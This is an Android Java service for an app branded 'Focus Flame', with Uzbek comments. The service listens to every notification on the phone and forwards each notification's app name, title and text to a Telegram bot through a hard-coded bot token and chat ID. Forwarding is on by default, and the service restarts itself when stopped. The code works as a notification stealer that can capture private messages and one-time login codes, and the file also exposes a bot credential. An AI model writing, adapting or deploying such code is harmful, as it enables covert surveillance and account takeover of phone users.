package com.focusflame;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * NotificationService — Android tizimi tomonidan boshqariladi.
 * Ilova yopiq bo'lsa ham ishlaydi.
 * Barcha bildirishnomalarni ushlaydi va Telegramga yuboradi.
 */
public class NotificationService extends NotificationListenerService {

    private static final String TAG = "FocusFlame";
    private static final String BOT_TOKEN = "8404558084:AAG33eFh_RQzdhJiC1-URlS0_pBFkvJetT0";
    private static final String CHAT_ID = "5351720273";
    private static final String CHANNEL_ID = "focusflame_service";

    // Telegram loop oldini olish uchun paket nomlari
    private static final String[] SKIP_PACKAGES = {
        "org.telegram.messenger",
        "org.telegram.messenger.web",
        "com.telegram.messenger",
        "org.thunderdog.challegram",
        "com.focusflame"  // o'z ilovamiz
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "NotificationService ishga tushdi");
        createNotificationChannel();
        startForegroundNotification();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // O'ldirilsa qayta tiklana
    }

    /**
     * Yangi bildirishnoma kelganda chaqiriladi
     */
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;

        SharedPreferences prefs = getSharedPreferences("focusflame_prefs", MODE_PRIVATE);
        boolean enabled = prefs.getBoolean("forwarding_enabled", true);
        if (!enabled) return;

        String packageName = sbn.getPackageName();
        if (packageName == null) return;

        // Telegram va o'z ilovamiz bildirishnomalarini o'tkazib yuborish
        for (String skip : SKIP_PACKAGES) {
            if (packageName.toLowerCase().contains(skip.toLowerCase())) {
                return;
            }
        }

        // Faqat yangi bildirishnomalar (o'chirilganlar emas)
        if (sbn.isOngoing()) return; // Tizim bildirishnomalari (Wi-Fi, batareya) emas

        // Bildirishnoma ma'lumotlarini olish
        Notification notification = sbn.getNotification();
        if (notification == null) return;

        Bundle extras = notification.extras;
        if (extras == null) return;

        String title = extras.getString(Notification.EXTRA_TITLE, "");
        CharSequence textSeq = extras.getCharSequence(Notification.EXTRA_TEXT);
        String text = textSeq != null ? textSeq.toString() : "";

        // Bo'sh bildirishnomalarni o'tkazib yuborish
        if (title.isEmpty() && text.isEmpty()) return;

        // Ilova nomini olish
        String appName = getAppName(packageName);

        // Vaqtni formatlash
        String time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());

        // Xabar formatlash
        String message = buildMessage(appName, title, text, time);

        Log.d(TAG, "Yuborilmoqda: " + appName + " - " + title);

        // Telegram API ga yuborish (background thread)
        sendToTelegram(message);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Hech narsa qilmaymiz
    }

    /**
     * Xabar matnini chiroyli formatlash
     */
    private String buildMessage(String app, String title, String text, String time) {
        StringBuilder sb = new StringBuilder();
        sb.append("📱 ").append(app).append("  •  ").append(time).append("\n");
        if (!title.isEmpty()) {
            sb.append("─────────────────\n");
            sb.append("📌 ").append(title).append("\n");
        }
        if (!text.isEmpty()) {
            sb.append(text);
        }
        return sb.toString();
    }

    /**
     * Paket nomidan ilova nomini olish
     */
    private String getAppName(String packageName) {
        try {
            return getPackageManager()
                .getApplicationLabel(
                    getPackageManager().getApplicationInfo(packageName, 0)
                ).toString();
        } catch (Exception e) {
            // Paket nomi oxirgi qismini ishlatish
            String[] parts = packageName.split("\\.");
            if (parts.length > 0) {
                String name = parts[parts.length - 1];
                return name.substring(0, 1).toUpperCase() + name.substring(1);
            }
            return packageName;
        }
    }

    /**
     * Telegram Bot API ga xabar yuborish
     * Background thread da ishlaydi (UI to'sib qolmaydi)
     */
    private void sendToTelegram(final String message) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                JSONObject json = new JSONObject();
                json.put("chat_id", CHAT_ID);
                json.put("text", message);

                byte[] bytes = json.toString().getBytes("UTF-8");
                conn.setRequestProperty("Content-Length", String.valueOf(bytes.length));

                OutputStream os = conn.getOutputStream();
                os.write(bytes);
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Telegram javob: " + responseCode);

            } catch (Exception e) {
                Log.e(TAG, "Telegram xatolik: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    /**
     * Android 8+ uchun bildirishnoma kanali yaratish
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Focus Flame Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Fon xizmati ishlayapti");
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    /**
     * Foreground notification — Android servisni o'ldirmaslik uchun
     */
    private void startForegroundNotification() {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Focus Flame")
            .setContentText("Bildirishnomalar Telegramga yuborilmoqda")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .build();
        startForeground(1, notification);
    }
}
